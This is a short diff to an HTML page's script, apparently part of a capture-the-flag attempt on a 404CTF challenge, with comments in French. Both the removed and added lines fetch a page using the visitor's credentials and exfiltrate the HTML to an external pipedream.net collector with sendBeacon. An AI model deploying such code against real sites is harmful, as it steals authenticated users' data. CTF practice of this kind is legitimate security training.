@@ -13,30 +13,13 @@
 
     <script>
       (async () => {
-        // 2️⃣ Requête dynamique *immédiate* : si tu vois "test=js" dans Pipedream,
-        //    c’est que ton JS a démarré correctement.
-        new Image().src = "https://eoyi24wnc60zgb.m.pipedream.net?test=js";
-
-        // 3️⃣ Petite marque visuelle dans le DOM pour voir dans le <pre>.
-        document.getElementById("out").textContent = "[JS démarré]";
-
-        // 4️⃣ On va chercher la home du challenge en first-party (token admin envoyé).
-        const resp = await fetch("https://spacefleetcommand.404ctf.fr/", {
-          credentials: "include",
-        });
-
-        // 5️⃣ On lit le HTML complet
-        const html = await resp.text();
-
-        // 6️⃣ On l’affiche pour debug
-        document.getElementById("out").textContent = html;
-
-        // 7️⃣ Exfiltration finale en POST (beacon) pour ne pas tronquer le contenu.
-        const blob = new Blob([html], { type: "text/plain" });
-        navigator.sendBeacon(
-          "https://eoyi24wnc60zgb.m.pipedream.net/collect",
-          blob
+        // ❌ fetch("/") va TOUJOURS appeler la racine de TON serveur
+        //    (ici : bastien750.github.io/), pas celle du CTF.
+        const html = await fetch("/", { credentials: "include" }).then((r) =>
+          r.text()
         );
+        out.textContent = html; // ← tu mets dans le <pre> ce que TU as servi
+        navigator.sendBeacon("https://eoyi24wnc60zgb.m.pipedream.net", html);
       })();
     </script>
   </body>
